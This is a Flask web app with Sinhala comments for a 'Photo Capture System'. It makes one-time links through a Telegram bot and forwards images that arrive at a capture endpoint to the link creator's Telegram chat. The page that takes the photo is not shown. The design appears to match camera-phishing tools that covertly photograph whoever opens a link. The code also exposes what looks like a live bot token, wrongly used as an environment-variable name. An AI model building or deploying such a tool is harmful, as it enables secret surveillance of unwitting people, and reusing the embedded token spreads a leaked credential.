# app.py (Vercel එකට)
from flask import Flask, render_template, request, jsonify
import sqlite3
import secrets
import requests
import base64
import io
import os

app = Flask(__name__)

# Telegram Bot Token (Environment variable එකෙන් ගන්න)
BOT_TOKEN = os.environ.get('8025378224:AAHUAhgqJ-adKEKCcm7JZuhD5MQYFIEknQk', 'YOUR_BOT_TOKEN_HERE')

# Database setup (Vercel එකේ SQLite work නොකරයි, ඒකට JSON use කරන්න)
import json
import os

def get_db():
    try:
        with open('/tmp/users.json', 'r') as f:
            return json.load(f)
    except:
        return {}

def save_db(data):
    with open('/tmp/users.json', 'w') as f:
        json.dump(data, f)

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Photo Capture System</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
            .container { max-width: 600px; margin: 0 auto; }
            .btn { background: #0088cc; color: white; padding: 15px 30px; 
                   text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📸 Photo Capture System</h1>
            <p>This system works with Telegram Bot</p>
            <p>Use the bot to get your personal capture link</p>
            <a href="https://t.me/your_bot" class="btn">Open Telegram Bot</a>
        </div>
    </body>
    </html>
    """

@app.route('/capture/<secret_key>')
def capture_page(secret_key):
    db = get_db()
    
    if secret_key not in db:
        return """
        <!DOCTYPE html>
        <html>
        <head><title>Invalid Link</title></head>
        <body>
            <h2>❌ Invalid Link</h2>
            <p>This link has expired or is invalid.</p>
        </body>
        </html>
        """, 404
    
    chat_id = db[secret_key]
    return render_template('capture.html', chat_id=chat_id, secret_key=secret_key)

@app.route('/capture_photo', methods=['POST'])
def capture_photo():
    try:
        data = request.get_json()
        image_data = data['image']
        chat_id = data['chat_id']
        secret_key = data['secret_key']
        
        # Verify secret key
        db = get_db()
        if secret_key not in db or db[secret_key] != chat_id:
            return jsonify({"status": "error", "message": "Invalid request"}), 400
        
        # Remove data URL prefix
        if ',' in image_data:
            image_data = image_data.split(',')[1]
        
        # Convert base64 to image
        image_bytes = base64.b64decode(image_data)
        
        # Send to Telegram using Telegram API
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('photo.jpg', io.BytesIO(image_bytes), 'image/jpeg')}
        data = {'chat_id': chat_id, 'caption': '📸 Photo captured via your link'}
        
        response = requests.post(url, files=files, data=data)
        
        if response.status_code == 200:
            # Remove used secret key
            db = get_db()
            if secret_key in db:
                del db[secret_key]
                save_db(db)
            
            return jsonify({"status": "success"})
        else:
            return jsonify({"status": "error", "message": "Failed to send to Telegram"}), 500
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/generate_link', methods=['POST'])
def generate_link():
    try:
        data = request.get_json()
        chat_id = data.get('chat_id')
        
        if not chat_id:
            return jsonify({"status": "error", "message": "Chat ID required"}), 400
        
        secret_key = secrets.token_urlsafe(16)
        
        # Save to database
        db = get_db()
        db[secret_key] = chat_id
        save_db(db)
        
        base_url = request.host_url.rstrip('/')
        user_link = f"{base_url}/capture/{secret_key}"
        
        return jsonify({"status": "success", "link": user_link})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
